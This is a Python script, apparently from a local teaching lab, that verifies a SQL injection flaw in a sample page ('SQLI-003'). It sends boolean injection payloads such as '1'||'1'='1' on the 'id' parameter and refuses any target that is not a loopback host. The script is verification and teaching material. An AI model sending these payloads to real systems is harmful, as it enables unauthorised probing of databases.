#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQLI-003 local-only SQL injection verification draft.

Scope: authorized local teaching lab only. The script refuses any target
whose host is not localhost/127.0.0.1/::1, never follows redirects, and
never dumps or enumerates database contents: it only compares a boolean
differential on the 'id' GET parameter.

Usage:
    python3 sqli_003_check.py --base-url http://127.0.0.1:8080 --path /sqli/SQLI-003.php
"""

import argparse
import http.client
import ipaddress
import sys
import urllib.parse

LOOPBACK_NAMES = {"localhost", "127.0.0.1", "::1"}
MARKER = "Your Login name:"


def check_target(base_url):
    parsed = urllib.parse.urlsplit(base_url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("base URL must use http or https, got %r" % parsed.scheme)
    host = parsed.hostname or ""
    if host in LOOPBACK_NAMES:
        return parsed
    try:
        if ipaddress.ip_address(host).is_loopback:
            return parsed
    except ValueError:
        pass
    raise ValueError("refusing non-loopback target host: %r" % host)


def get(base_url, path, param, value, timeout):
    parsed = check_target(base_url)
    sep = "&" if "?" in path else "?"
    target = path + sep + urllib.parse.urlencode({param: value})
    port = parsed.port
    if parsed.scheme == "https":
        conn = http.client.HTTPSConnection(parsed.hostname, port, timeout=timeout)
    else:
        conn = http.client.HTTPConnection(parsed.hostname, port, timeout=timeout)
    try:
        conn.request("GET", target, headers={"User-Agent": "wp2-local-sqli-check/1.0"})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        return resp.status, resp.getheader("Location"), body
    finally:
        conn.close()


def observe(base_url, path, param, value, timeout):
    try:
        status, location, body = get(base_url, path, param, value, timeout)
    except (OSError, http.client.HTTPException, ValueError) as exc:
        return {"value": value, "kind": "request_error", "detail": str(exc)}
    if status in (301, 302, 303, 307, 308):
        return {"value": value, "kind": "redirect", "detail": location or ""}
    if status != 200:
        return {"value": value, "kind": "http_status_%d" % status, "detail": ""}
    if MARKER in body:
        return {"value": value, "kind": "row_returned", "detail": ""}
    return {"value": value, "kind": "no_row", "detail": ""}


def main(argv=None):
    parser = argparse.ArgumentParser(description="Local-only SQLI-003 injection check")
    parser.add_argument("--base-url", required=True,
                        help="http(s)://localhost|127.0.0.1|::1[:port]")
    parser.add_argument("--path", required=True,
                        help="request path of the deployed sample, e.g. /sqli/SQLI-003.php")
    parser.add_argument("--param", default="id", help="vulnerable GET parameter name")
    parser.add_argument("--timeout", type=float, default=5.0, help="per-request timeout in seconds")
    args = parser.parse_args(argv)

    cases = [
        ("baseline", "1"),
        ("boolean_true", "1'||'1'='1"),
        ("boolean_false", "1'||'1'='2"),
    ]
    results = {}
    for label, value in cases:
        results[label] = observe(args.base_url, args.path, args.param, value, args.timeout)
        print("[%s] %-14s %s" % (label, results[label]["kind"], results[label]["detail"]))
    print("requests sent:", ", ".join("%s=%s" % (args.param, v) for _, v in cases))

    ok = (results["baseline"]["kind"] == "row_returned"
          and results["boolean_true"]["kind"] == "row_returned"
          and results["boolean_false"]["kind"] == "no_row")
    print("expected differential observed:", ok)
    return 0 if ok else 2


if __name__ == "__main__":
    sys.exit(main())
